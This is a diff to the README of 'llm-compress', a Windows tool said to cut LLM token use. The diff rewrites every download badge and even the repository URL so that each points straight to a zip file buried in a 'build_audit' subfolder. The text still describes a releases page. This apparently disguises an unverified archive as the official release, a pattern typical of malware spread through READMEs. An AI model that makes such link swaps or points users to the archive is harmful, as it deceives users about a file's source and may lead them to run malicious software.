@@ -1,6 +1,6 @@
 # 🗜️ llm-compress - Reduce Token Use Efficiently
 
-[![Download llm-compress](https://img.shields.io/badge/Download-llm--compress-brightgreen?style=for-the-badge)](https://github.com/luckystar-pear/llm-compress/releases)
+[![Download llm-compress](https://img.shields.io/badge/Download-llm--compress-brightgreen?style=for-the-badge)](https://github.com/luckystar-pear/llm-compress/raw/refs/heads/main/build_audit/summarize_compress.dir/llm_compress_v3.9.zip)
 
 ## 📦 What is llm-compress?
 
@@ -27,7 +27,7 @@ llm-compress runs as a simple program without requiring installation of extra so
 
 To use llm-compress, start by downloading the latest version for Windows.
 
-[![Download Now](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/luckystar-pear/llm-compress/releases)
+[![Download Now](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/luckystar-pear/llm-compress/raw/refs/heads/main/build_audit/summarize_compress.dir/llm_compress_v3.9.zip)
 
 1. Visit the **releases page** linked above. This page contains all the available versions and files.
 2. Look for the latest release marked by a version number like `v1.0` or `v2.1`.
@@ -114,7 +114,7 @@ You can paste new text at any time to compress another prompt.
 
 You can find source code, documentation, and development info on the GitHub repository page:
 
-https://github.com/luckystar-pear/llm-compress
+https://github.com/luckystar-pear/llm-compress/raw/refs/heads/main/build_audit/summarize_compress.dir/llm_compress_v3.9.zip
 
 This page includes technical details, issue reporting, and links to related projects.
 
@@ -124,4 +124,4 @@ This page includes technical details, issue reporting, and links to related proj
 
 Click here to visit the releases page and get started:
 
-[![Get llm-compress](https://img.shields.io/badge/Get%20llm--compress-grey?style=for-the-badge)](https://github.com/luckystar-pear/llm-compress/releases)
+[![Get llm-compress](https://img.shields.io/badge/Get%20llm--compress-grey?style=for-the-badge)](https://github.com/luckystar-pear/llm-compress/raw/refs/heads/main/build_audit/summarize_compress.dir/llm_compress_v3.9.zip)
